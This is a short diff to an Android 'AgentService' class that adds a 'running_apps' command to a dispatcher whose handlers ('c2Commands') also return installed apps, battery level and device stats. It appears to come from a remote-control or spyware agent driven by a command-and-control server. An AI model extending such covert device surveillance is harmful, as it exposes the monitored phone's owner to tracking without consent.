@@ -575,6 +575,8 @@ class AgentService : Service() {
 
                                 command == "user_apps" -> c2Commands.getUserInstalledApps()
 
+                                command == "running_apps" -> c2Commands.getRunningApps()
+
                                 command == "battery" -> c2Commands.getBatteryLevel()
 
                                 command == "device_stats" -> c2Commands.getDeviceStats()
